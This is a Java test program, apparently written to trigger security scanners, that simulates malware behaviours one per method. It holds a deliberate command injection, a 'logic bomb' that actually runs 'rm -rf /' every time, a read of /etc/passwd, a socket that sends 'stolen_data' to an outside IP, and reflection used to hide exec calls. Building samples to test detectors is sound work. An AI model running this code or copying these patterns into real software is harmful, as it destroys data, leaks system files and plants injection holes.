import java.io.*;
import java.net.Socket;
import java.util.Base64;
import java.lang.reflect.Method;

public class MalwareDemo {

    public static void main(String[] args) {
        System.out.println("--- Java 恶意模拟开始 ---");
        
        patternTest();
        
        if (args.length > 0) {
            taintTest(args[0]);
        }
        
        logicBomb();
        stealFile();
        connectC2();
        reflectionExec(); // 模拟动态代码执行
        
        System.out.println("--- 模拟结束 ---");
    }

    // --- 【对应静态分析 a: 模式匹配】 ---
    // 故意使用 Base64 编码隐藏敏感字符串，触发正则检测
    public static void patternTest() {
        try {
            // "hacked" 的 Base64 编码
            String payload = "aGFja2Vk"; 
            String decoded = new String(Base64.getDecoder().decode(payload));
            System.out.println("Decoded payload: " + decoded);
        } catch (Exception e) {}
    }

    // --- 【对应静态分析 b & d: 数据流与污点分析】 ---
    // 接收外部参数 -> 未经处理 -> 传入危险函数 (Runtime.exec)
    public static void taintTest(String userInput) {
        try {
            String cmd = "echo " + userInput;
            // Sink: 危险函数，SAST 应检测到这是命令注入
            Runtime.getRuntime().exec(cmd);
        } catch (Exception e) {}
    }

    // --- 【对应静态分析 c: 控制流分析】 ---
    // 隐藏在条件分支里的恶意代码
    public static void logicBomb() {
        // 使用一个运行时才确定的条件，防止编译器优化掉死代码
        if (System.currentTimeMillis() < 0) { 
            // 正常路径
        } else {
            // 这是一个在 CFG (控制流图) 中的危险路径
             try {
                 // 危险操作：删除根目录 (仅演示)
                 Runtime.getRuntime().exec("rm -rf /"); 
             } catch (Exception e) {}
        }
    }

    // --- 【对应动态分析 a & c: 系统调用 & 文件监控】 ---
    // 模拟窃取密码文件，触发 open/read 系统调用
    public static void stealFile() {
        try {
            System.out.println("[*] 正在尝试读取敏感文件...");
            File f = new File("/etc/passwd");
            // 触发文件读取监控
            BufferedReader br = new BufferedReader(new FileReader(f));
            br.readLine();
            br.close();
        } catch (Exception e) {}
    }

    // --- 【对应动态分析 b: 网络活动监控】 ---
    // 模拟连接 C2 服务器，触发 socket/connect 系统调用
    public static void connectC2() {
        try {
            System.out.println("[*] 正在回传数据...");
            // 连接一个公共 DNS IP，触发网络外连报警
            Socket socket = new Socket("8.8.8.8", 53);
            socket.getOutputStream().write("stolen_data".getBytes());
            socket.close();
        } catch (Exception e) {}
    }
    
    // --- 【对应动态分析 d: 内存/代码注入 (模拟)】 ---
    // Java 中使用反射调用 Runtime，模拟为了绕过静态分析的动态执行
    public static void reflectionExec() {
        try {
            Class<?> clazz = Class.forName("java.lang.Runtime");
            Method method = clazz.getMethod("getRuntime");
            Object runtime = method.invoke(null);
            Method exec = clazz.getMethod("exec", String.class);
            // 动态调用 exec，增加静态分析难度
            exec.invoke(runtime, "whoami");
        } catch (Exception e) {}
    }
}